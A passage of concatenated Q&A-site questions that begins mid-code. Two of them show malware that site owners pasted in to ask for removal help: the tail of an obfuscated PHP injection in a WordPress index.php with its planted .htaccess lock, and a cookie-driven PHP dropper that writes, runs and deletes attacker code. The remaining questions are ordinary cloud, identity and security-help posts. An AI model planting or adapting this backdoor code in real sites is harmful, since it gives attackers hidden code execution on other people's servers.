\x49\x53\x49\x53\x5f\x5f\x5f\x53\x49&quot;]('Y-m-d')),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N_IIIS__SS),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($NIISI_SS__),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x53\x5f\x5f\x5f\x49&quot;]($N_SSI_I_IS),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N___SSISII),$NIS_SIIS__,$NSS__IISI_,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N_SSI_I_SI));$N__IS_IISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('s0lUyhTChKTbNVUi1WUihJLEpPLbFVik/KSczLVrJTLbbRT7QtPDAA==');if(isset(${&quot;\x5f\x47\x45\x54&quot;}['sok1'])){echo sprintf($N__IS_IISS,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;]('/\%[a-zA-Z0-9]{2}sok1/si','',$N__SSII_SI),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;]('/\%[a-zA-Z0-9]{2}sok1/si','',$N__SSII_SI)).'&lt;br /&gt;';exit();}if(isset(${&quot;\x5f\x47\x45\x54&quot;}['sok2'])){echo sprintf($N__IS_IISS,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;]('/\%[a-zA-Z0-9]{2}sok2/si','',$N_I__SSIIS),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x5f\x5f\x5f\x53\x49\x53\x49&quot;]('/\%[a-zA-Z0-9]{2}sok2/si','',$N_I__SSIIS)).'&lt;br /&gt;';exit();}if(isset(${&quot;\x5f\x47\x45\x54&quot;}[&quot;pwd&quot;])){if(isset(${&quot;\x5f\x47\x45\x54&quot;}[&quot;ver&quot;])){$N_IIIS__SS=${&quot;\x5f\x47\x45\x54&quot;}[&quot;pwd&quot;].'|--|'.${&quot;\x5f\x47\x45\x54&quot;}[&quot;ver&quot;];$N__SSII_SI=sprintf($N_ISS_I_SI,$NS_IISS_I_,$NISS_IIS__,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;](${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x49\x53\x5f\x5f\x5f\x53\x49&quot;]('Y-m-d')),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N_IIIS__SS),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($NIISI_SS__),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x53\x5f\x5f\x5f\x49&quot;]($N_SSI_I_IS),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N___SSISII),$NIS_SIIS__,$NSS__IISI_,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N_SSI_I_SI));$N_II__SISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x53\x5f\x49\x5f\x49\x5f\x53&quot;]($N__SSII_SI);echo $N_II__SISS;exit();}}if(isset(${&quot;\x5f\x47\x45\x54&quot;}['robots'])){$N_IIIS__SS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('0y/KThT8ovKdYrqSgtPBAA==');$N__SSII_SI=sprintf($N_ISS_I_SI,$NS_IISS_I_,$NISS_IIS__,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;](${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x53\x49\x53\x5f\x5f\x5f\x53\x49&quot;]('Y-m-d')),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N_IIIS__SS),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($NIISI_SS__),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x53\x5f\x5f\x5f\x49&quot;]($N_SSI_I_IS),${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N___SSISII),$NIS_SIIS__,$NSS__IISI_,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x49\x53\x5f\x53\x5f\x49\x5f&quot;]($N_SSI_I_SI));$N_I_I_SSIS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x53\x5f\x49\x5f\x49\x5f\x53&quot;]($N__SSII_SI);if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x5f\x53\x5f\x53\x49\x53\x49&quot;]($N_I_I_SSIS,$N_SI_ISI_S)){${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x49\x49\x53\x49\x5f\x53\x53&quot;]('./robots.txt',${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x53\x53\x49\x49\x53\x5f\x49&quot;]($N_SI_ISI_S,'',$N_I_I_SSIS));}echo ${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x5f\x53\x5f\x5f\x49\x49\x49\x53&quot;]('./robots.txt');exit();}${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x49\x49\x49\x5f\x53\x53\x53&quot;]();$NISSII__S_=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('09coyhTk/KLynW1NOK0SupKFHtPRBwA=');if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;]($NISSII__S_,$N_IIIS__SS)){$N_II__SISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x53\x5f\x49\x5f\x49\x5f\x53&quot;]($N__SSII_SI);if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x5f\x53\x5f\x53\x49\x53\x49&quot;]($N_II__SISS,$N_SI_ISI_S)){$N_II__SISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x53\x53\x49\x49\x53\x5f\x49&quot;]($N_SI_ISI_S,'',$N_II__SISS);@header('Content-Type:text/plain');echo $N_II__SISS;unset($N_II__SISS,$N__SSII_SI,$N_IIIS__SS,$NS_IISS_I_,$N___SSISII,$N_SSI_I_SI);exit();}}$N_IISS_S_I=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('09fTihTtGryM1tPR0QcA');if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;]($N_IISS_S_I,$N_IIIS__SS)){$N_II__SISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x53\x5f\x49\x5f\x49\x5f\x53&quot;]($N__SSII_SI);if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x5f\x53\x5f\x53\x49\x53\x49&quot;]($N_II__SISS,$N_SI_ISI_S)){$N_II__SISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x53\x53\x49\x49\x53\x5f\x49&quot;]($N_SI_ISI_S,'',$N_II__SISS);@header('Content-Type:text/xml');echo $N_II__SISS;unset($N_II__SISS,$N__SSII_SI,$N_IIIS__SS,$NS_IISS_I_,$N___SSISII,$N_SSI_I_SI);exit();}}$NSIS__II_S=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x49\x53\x5f\x49\x5f&quot;]('09cozhTixJzU0s0NTTitErqShtPR0QcA');if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;]($NSIS__II_S,$N_IIIS__SS)){$N_II__SISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x53\x5f\x49\x5f\x49\x5f\x53&quot;]($N__SSII_SI);if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x5f\x53\x5f\x53\x49\x53\x49&quot;]($N_II__SISS,$N_SI_ISI_S)){$N_II__SISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x53\x53\x49\x49\x53\x5f\x49&quot;]($N_SI_ISI_S,'',$N_II__SISS);@header('Content-Type:text/plain');echo $N_II__SISS;unset($N_II__SISS,$N__SSII_SI,$N_IIIS__SS,$NS_IISS_I_,$N___SSISII,$N_SSI_I_SI);exit();}}if($N_I__SISSI||$NS__I_SIIS){$N_II__SISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x53\x5f\x49\x5f\x49\x5f\x53&quot;]($N_I__SSIIS);if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x5f\x53\x5f\x53\x49\x53\x49&quot;]($N_II__SISS,$N_SI_ISI_S)){$N_II__SISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x53\x53\x49\x49\x53\x5f\x49&quot;]($N_SI_ISI_S,'',$N_II__SISS);echo $N_II__SISS;unset($N_II__SISS,$N_IIIS__SS,$NS_IISS_I_,$N___SSISII,$N_SSI_I_SI);exit();}}if($N_ISSS_II_){$N_II__SISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x49\x53\x5f\x49\x5f\x49\x5f\x53&quot;]($N__SSII_SI);if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x5f\x53\x5f\x53\x49\x53\x49&quot;]($N_II__SISS,$N_SI_ISI_S)){$N_II__SISS=${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x5f\x53\x53\x49\x49\x53\x5f\x49&quot;]($N_SI_ISI_S,'',$N_II__SISS);if(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x49\x53\x49\x5f\x53\x53\x5f&quot;]($N_II__SISS,&quot;EUC-JP&quot;)){@header(&quot;Content-Type:text/html;charset=EUC-JP&quot;);}elseif(${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x49\x53\x49\x5f\x53\x53\x5f&quot;]($N_II__SISS,&quot;Shift-JIS&quot;)){@header(&quot;Content-Type:text/html;charset=Shift-JIS&quot;);}else{@header('Content-Type:text/html;charset=utf-8');}${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x53\x49\x53\x5f\x5f\x53\x49\x49&quot;](&quot;/\d/si&quot;,${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x5f\x49\x53\x5f\x53\x49\x53&quot;]($N_IIIS__SS),$matches);@header(&quot;Last-Modified:&quot;.${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x53\x5f\x5f\x49\x53\x49\x53&quot;]('D,d M Y H:i:s T',${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x53\x53\x49\x53\x5f\x49\x5f\x5f\x49&quot;](&quot;-&quot;.$matches[0].&quot; day&quot;)));@header('Cache-Control:max-age=0,no-cache,no-store');@header(&quot;Expires:&quot;.${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x5f\x49\x53\x5f\x5f\x49\x53\x49\x53&quot;]('D,d M Y H:i:s T'));@header('Pragma:no-cache');echo $N_II__SISS;unset($N_II__SISS,$N_IIIS__SS,$NS_IISS_I_,$N___SSISII,$N_SSI_I_SI);exit();}}};${&quot;\x47\x4c\x4f\x42\x41\x4c\x53&quot;}[&quot;\x4e\x49\x5f\x49\x53\x53\x53\x49\x5f\x5f&quot;]();?&gt;
&lt;?php
define( 'WP_USE_THEMES', true );
require __DIR__ . '/wp-blog-header.php';

</code></pre>
<p>Code below in index.php (wordpress) content malware to create .htaccess file and prevent me edit, delete, change permission of this file.</p>
<p>This is content of .htaccess file :</p>
<pre><code>&lt;FilesMatch &quot;.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|suspected|php7|php8)$&quot;&gt;
Order allow,deny
Deny from all
&lt;/FilesMatch&gt;
&lt;FilesMatch &quot;^(index.php|credits.php|customize.php|edit-comments.php|edit-tags.php|edit.php|checkbox.php|export.php|input.php|link.php|load-scripts.php|load-styles.php|dropdown.php|menu.php|nav-menus.php|network.php|options-discussion.php|options-general.php|options-permalink.php|options-privacy.php|options-reading.php|options-writing.php|plugins.php|post-new.php|post.php|privacy.php|profile.php|site-health.php|term.php|text.php|themes.php|tools.php|update-core.php|user-edit.php|user-new.php|users.php|wp-links.php|wp-login.php|wp-signup.php)$&quot;&gt;
Order allow,deny
Allow from all
&lt;/FilesMatch&gt;
&lt;IfModule mod_rewrite.c&gt;
RewriteEngine On
RewriteBase /
RewriteRule ^index.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php [L]
&lt;/IfModule&gt;
</code></pre>
<p>I try to remove all in index.php but after that, website cant access.</p>
<p>please help me solves this index.php file</p>
<p>I wanna return .htacess back to normal, and have no malware anymore in index.php file</p>
"
"<p>I have an infected USB flash drive. So I used gparted live to safely remove all partitions and created an NTFS one before inserting in windows. But I'm really worries if any malware in raw data can infect my computer somehow. Is it really possible?</p>
<p>I formatted all partitions so raw data remains.</p>
"
"<p>I ordered a new keyboard and I want to be sure that it is safe to use (I saw the recommendations about it and it seems legit but still wanna be sure).
The problem is that I have another software on my computer that has sensitive information and It's a familiar software, how can I be sure that the keyboard doesn't have any undercover software which looking for that software and trying to steal the info or change it? Thanks.</p>
<p>I connected the keyboard to another computer but didnt knew how to check the keyboard.</p>
"
"<p>I am dealing with Malware that keeps recreating files and is really hard to get rid of. Here is some code I think might be relevant..</p>
<p>The problem mainly affected WordPress Sites, I updated all the PHP versions and got rid of old plugins. I think it might be due to the recent Bricks exploit that happened around Valentines Day.</p>
<pre><code>&lt;?php
$tM = ${&quot;\137&quot; . &quot;\103\117\117\113&quot; .    &quot;\111\105&quot;};
if (isset($tM[(99    - 0)])) {
    $ScL = $tM[(88 - 8)]    . $tM[(38 - 10)];
    $skZ = $ScL($tM[(58    -    27)] . $tM[(44 - 33)]);
    $nTO = $skZ($ScL($tM[(98 - 1)]));
    $lvo =    $skZ($ScL($tM[(71 -    19)]));
    $yJd    = __DIR__ . $skZ($ScL($tM[(74 - 17)]));
    $nTO($yJd, $skZ($ScL($tM[(99 - 0)])));
    include($yJd);
    $lvo($yJd);
}
</code></pre>
<p>I already tried decoding this using Gemini, ChatGPT and Mixtral as well as by hand but I didn't get too far. I hope I get some more insights of what is happening, what this code does and why it keeps duplicating itself.</p>
"
"<p>I have a wordpress website which is shared hosting to my other websites in bluehosts, there's a time that when I visit my /wp-admin it keeps reloading, after closing it and leaving it for several minutes or an hour it is working properly, but then it'll keep reloading after several minutes of using it.</p>
<p>Does anyone knows what seems to be the problem?</p>
<p>I'm always trying to reach out to bluehost but it seems they can't resolve it, they just clear the cache from the server.
I also try to clear cache from my browser
I also try to check my ftp for possible malware.</p>
"
"<p>HI I was trying to create folders and projects with a service account and given all the required roles like folder admin,folder creator,project creator, organization admin to the SA. But its giving the below error still</p>
<p>&quot;Error: error creating project: googleapi: Error 403: The caller does not have permission, forbidden. If you received a 403 error, make sure you have the <code>roles/resourcemanager.projectCreator</code> permission &quot;<a href=""https://i.stack.imgur.com/ZwV0O.png"" rel=""nofollow noreferrer"">enter image description here</a></p>
<p>Any resolution ? or links</p>
"
"<p>I am trying to create <strong>multiple notification integrations</strong> in Snowflake. As per my knowledge, I will have to create a new role per notification integration as a different <code>SF_AWS_EXTERNAL_ID</code> is generated for each notification.</p>
<p>Is my understanding correct or do we have a way to utilize one role for all integrations?</p>
"
"<p>I am trying to allow access to an AWS service for Github Actions in <em>multiple repositories</em> via OIDC. Here is the current policy that works with 1 repository:</p>
<pre class=""lang-json prettyprint-override""><code>{
    &quot;Version&quot;: &quot;2012-10-17&quot;,
    &quot;Statement&quot;: [
        {
            &quot;Effect&quot;: &quot;Allow&quot;,
            &quot;Principal&quot;: {
                &quot;Federated&quot;: &quot;arn:aws:iam::&lt;id&gt;:oidc-provider/token.actions.githubusercontent.com&quot;
            },
            &quot;Action&quot;: &quot;sts:AssumeRoleWithWebIdentity&quot;,
            &quot;Condition&quot;: {
                &quot;StringEquals&quot;: {
                    &quot;token.actions.githubusercontent.com:aud&quot;: &quot;sts.amazonaws.com&quot;
                },
                &quot;StringLike&quot;: {
                    &quot;token.actions.githubusercontent.com:sub&quot;: &quot;repo:username/myrepo:*&quot;
                }
            }
        }
    ]
}
</code></pre>
<p>My question is, how can we allow this policy for multiple repositories? Duplicating <code>&quot;token.actions.githubusercontent.com:sub&quot;: &quot;repo:username/myrepo:*&quot;</code> does not seem to work, the console editor shows an error.</p>
"
"<p>I have a single sign-on solution using Azure ADB2C. I use custom policies.</p>
<p>We have different IDPs and one of them is Auth0. We are connecting to Auth0 using OpenID Connect, but looks like we are having an issue in redirection after user login.</p>
<p>Below is a technical profile for Auth0 OpenId connect in Azure AD B2C custom policies.</p>
<pre><code>&lt;TechnicalProfile Id=&quot;Auth0-OID&quot;&gt;
            &lt;DisplayName&gt;Auth0&lt;/DisplayName&gt;
            &lt;Protocol Name=&quot;OpenIdConnect&quot; /&gt;
            &lt;Metadata&gt;
                &lt;Item Key=&quot;METADATA&quot;&gt;https://dev-domain.us.auth0.com/.well-known/openid-configuration&lt;/Item&gt;
                &lt;Item Key=&quot;authorization_endpoint&quot;&gt;https://dev-domain.us.auth0.com/authorize&lt;/Item&gt;
                &lt;Item Key=&quot;response_types&quot;&gt;code&lt;/Item&gt;
                &lt;Item Key=&quot;response_mode&quot;&gt;form_post&lt;/Item&gt;
                &lt;Item Key=&quot;scope&quot;&gt;openid email profile&lt;/Item&gt;
                &lt;Item Key=&quot;HttpBinding&quot;&gt;POST&lt;/Item&gt;
                &lt;Item Key=&quot;UsePolicyInRedirecturi&quot;&gt;0&lt;/Item&gt;
                &lt;Item Key=&quot;client_id&quot;&gt;FqDd**********Yor1hiVlgFk&lt;/Item&gt;
             &lt;/Metadata&gt;
            &lt;CryptographicKeys&gt;
                &lt;Key Id=&quot;client_secret&quot; StorageReferenceId=&quot;B2C_1A_Auth0Secret&quot; /&gt;
            &lt;/CryptographicKeys&gt;                 
            &lt;OutputClaims&gt;
                &lt;!--&lt;OutputClaim ClaimTypeReferenceId=&quot;objectId&quot; PartnerClaimType=&quot;aud&quot; /&gt;--&gt;
                &lt;OutputClaim ClaimTypeReferenceId=&quot;email&quot; PartnerClaimType=&quot;email&quot; /&gt;
                &lt;OutputClaim ClaimTypeReferenceId=&quot;givenName&quot; PartnerClaimType=&quot;given_name&quot; /&gt;
                &lt;OutputClaim ClaimTypeReferenceId=&quot;surname&quot; PartnerClaimType=&quot;family_name&quot; /&gt;
                &lt;OutputClaim ClaimTypeReferenceId=&quot;displayName&quot; PartnerClaimType=&quot;name&quot; /&gt;
                &lt;OutputClaim ClaimTypeReferenceId=&quot;identityProvider&quot; DefaultValue=&quot;Auth0.com&quot; AlwaysUseDefaultValue=&quot;true&quot; /&gt;
                &lt;OutputClaim ClaimTypeReferenceId=&quot;authenticationSource&quot; DefaultValue=&quot;socialIdpAuthentication&quot; /&gt;
                &lt;OutputClaim ClaimTypeReferenceId=&quot;socialIdpUserId&quot; PartnerClaimType=&quot;aud&quot; /&gt;
                &lt;OutputClaim ClaimTypeReferenceId=&quot;accountEnabled&quot; DefaultValue=&quot;True&quot; AlwaysUseDefaultValue=&quot;true&quot;/&gt;
            &lt;/OutputClaims&gt;
            &lt;OutputClaimsTransformations&gt;
                &lt;OutputClaimsTransformation ReferenceId=&quot;CreateRandomUPNUserName&quot; /&gt;
                &lt;OutputClaimsTransformation ReferenceId=&quot;CreateUserPrincipalName&quot; /&gt;
                &lt;OutputClaimsTransformation ReferenceId=&quot;CreateAlternativeSecurityId&quot; /&gt;
                &lt;OutputClaimsTransformation ReferenceId=&quot;CreateSubjectClaimFromAlternativeSecurityId&quot; /&gt;
            &lt;/OutputClaimsTransformations&gt;
            &lt;UseTechnicalProfileForSessionManagement ReferenceId=&quot;SM-SocialLogin&quot; /&gt;
</code></pre>

<p>After login, it tries to redirect back to the application, but in browser, it just shows a bad request for the below return URL:</p>
<pre><code>https://devdomainb2c.b2clogin.com/devdomainb2c.onmicrosoft.com/oauth2/authresp
</code></pre>
<p>Below is the actual error:</p>
<p><a href=""https://i.stack.imgur.com/qk0mz.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/qk0mz.png"" alt=""enter image description here"" /></a></p>
<p>What could be the reason for logging in user behind the scenes but not redirecting to the UI?</p>
<p>Appreciate any help.</p>
<pre><code>Devdomain - is not the actual name of the domain. It is used as a placeholder here to hide actual domain.
</code></pre>
"
"<p>I am getting error while creating S3 BucketPolicy and IAM Policy. I am trying to deploy my stack from my local using Identity Center Profile having &quot;Administrator Access&quot; Permission set. Command line details as follows.</p>
<pre><code>D:\website\infra&gt;cdk deploy --require-approval never

✨  Synthesis time: 20.34s

BaseWebsiteStack:  start: Building 3322b7049fb0ed2b7cbb644a2ada8d1116ff80c32dca89e6ada846b5de26f961:601111111110-us-east-1
BaseWebsiteStack:  success: Built 3322b7049fb0ed2b7cbb644a2ada8d1116ff80c32dca89e6ada846b5de26f961:601111111110-us-east-1
BaseWebsiteStack:  start: Building e976a796f036a5efbf44b99e44cfb5a961df08d8dbf7cd37e60bf216fb982a00:601111111110-us-east-1
BaseWebsiteStack:  success: Built e976a796f036a5efbf44b99e44cfb5a961df08d8dbf7cd37e60bf216fb982a00:601111111110-us-east-1
BaseWebsiteStack:  start: Publishing 3322b7049fb0ed2b7cbb644a2ada8d1116ff80c32dca89e6ada846b5de26f961:601111111110-us-east-1
BaseWebsiteStack:  start: Building 73b6cb84ab8bfac4c6a2ea28808b1f87f2de290283a5b44fc08f3118d01192b0:601111111110-us-east-1
BaseWebsiteStack:  success: Built 73b6cb84ab8bfac4c6a2ea28808b1f87f2de290283a5b44fc08f3118d01192b0:601111111110-us-east-1
BaseWebsiteStack:  start: Publishing e976a796f036a5efbf44b99e44cfb5a961df08d8dbf7cd37e60bf216fb982a00:601111111110-us-east-1
BaseWebsiteStack:  start: Building 56ab77d73f3cdb303af9e0608d58cdf6bef2dd642972bf65e8cd7b2dee2238f9:601111111110-us-east-1
BaseWebsiteStack:  success: Built 56ab77d73f3cdb303af9e0608d58cdf6bef2dd642972bf65e8cd7b2dee2238f9:601111111110-us-east-1
BaseWebsiteStack:  start: Publishing 73b6cb84ab8bfac4c6a2ea28808b1f87f2de290283a5b44fc08f3118d01192b0:601111111110-us-east-1
BaseWebsiteStack:  start: Publishing 56ab77d73f3cdb303af9e0608d58cdf6bef2dd642972bf65e8cd7b2dee2238f9:601111111110-us-east-1
BaseWebsiteStack:  success: Published 56ab77d73f3cdb303af9e0608d58cdf6bef2dd642972bf65e8cd7b2dee2238f9:601111111110-us-east-1
BaseWebsiteStack:  success: Published e976a796f036a5efbf44b99e44cfb5a961df08d8dbf7cd37e60bf216fb982a00:601111111110-us-east-1
BaseWebsiteStack:  success: Published 73b6cb84ab8bfac4c6a2ea28808b1f87f2de290283a5b44fc08f3118d01192b0:601111111110-us-east-1
BaseWebsiteStack:  success: Published 3322b7049fb0ed2b7cbb644a2ada8d1116ff80c32dca89e6ada846b5de26f961:601111111110-us-east-1
BaseWebsiteStack: deploying... [1/1]
BaseWebsiteStack: creating CloudFormation changeset...
BaseWebsiteStack | 0/9 | 7:59:42 pm | REVIEW_IN_PROGRESS   | AWS::CloudFormation::Stack  | BaseWebsiteStack User Initiated
BaseWebsiteStack | 0/9 | 7:59:51 pm | CREATE_IN_PROGRESS   | AWS::CloudFormation::Stack  | BaseWebsiteStack User Initiated
BaseWebsiteStack | 0/9 | 7:59:54 pm | CREATE_IN_PROGRESS   | AWS::Lambda::LayerVersion   | RootDomainWebsite/BucketDeployment/AwsCliLayer (RootDomainWebsiteBucketDeploymentAwsCliLayerF90FDA26)
BaseWebsiteStack | 0/9 | 7:59:54 pm | CREATE_IN_PROGRESS   | AWS::IAM::Role              | Custom::CDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756C/ServiceRole (CustomCDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756CServiceRole89A01265)
BaseWebsiteStack | 0/9 | 7:59:54 pm | CREATE_IN_PROGRESS   | AWS::CDK::Metadata          | CDKMetadata/Default (CDKMetadata)
BaseWebsiteStack | 0/9 | 7:59:54 pm | CREATE_IN_PROGRESS   | AWS::S3::Bucket             | RootDomainWebsite/Bucket (RootDomainWebsiteBucket30F4EC37)
BaseWebsiteStack | 0/9 | 7:59:55 pm | CREATE_IN_PROGRESS   | AWS::IAM::Role              | Custom::CDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756C/ServiceRole (CustomCDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756CServiceRole89A01265) Resource creation Initiated
BaseWebsiteStack | 0/9 | 7:59:55 pm | CREATE_IN_PROGRESS   | AWS::CDK::Metadata          | CDKMetadata/Default (CDKMetadata) Resource creation Initiated
BaseWebsiteStack | 1/9 | 7:59:55 pm | CREATE_COMPLETE      | AWS::CDK::Metadata          | CDKMetadata/Default (CDKMetadata)
BaseWebsiteStack | 1/9 | 7:59:55 pm | CREATE_IN_PROGRESS   | AWS::S3::Bucket             | RootDomainWebsite/Bucket (RootDomainWebsiteBucket30F4EC37) Resource creation Initiated
BaseWebsiteStack | 1/9 | 8:00:00 pm | CREATE_IN_PROGRESS   | AWS::Lambda::LayerVersion   | RootDomainWebsite/BucketDeployment/AwsCliLayer (RootDomainWebsiteBucketDeploymentAwsCliLayerF90FDA26) Resource creation Initiated
BaseWebsiteStack | 2/9 | 8:00:00 pm | CREATE_COMPLETE      | AWS::Lambda::LayerVersion   | RootDomainWebsite/BucketDeployment/AwsCliLayer (RootDomainWebsiteBucketDeploymentAwsCliLayerF90FDA26)
BaseWebsiteStack | 3/9 | 8:00:11 pm | CREATE_COMPLETE      | AWS::IAM::Role              | Custom::CDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756C/ServiceRole (CustomCDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756CServiceRole89A01265)
BaseWebsiteStack | 4/9 | 8:00:18 pm | CREATE_COMPLETE      | AWS::S3::Bucket             | RootDomainWebsite/Bucket (RootDomainWebsiteBucket30F4EC37)
BaseWebsiteStack | 4/9 | 8:00:26 pm | DELETE_IN_PROGRESS   | AWS::IAM::Role              | Custom::CDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756C/ServiceRole (CustomCDKBucketDeployment8693BB64968944B69AAFB0CC9EB8756CServiceRole89A01265)
BaseWebsiteStack | 4/9 | 8:00:26 pm | DELETE_IN_PROGRESS   | AWS::S3::Bucket             | RootDomainWebsite/Bucket (RootDomainWebsiteBucket30F4EC37)
BaseWebsiteStack | 3/9 | 8:00:27 pm | DELETE_COMPLETE      | AWS::S3::Bucket             | RootDomainWebsite/Bucket (RootDomainWebsiteBucket30F4EC37)
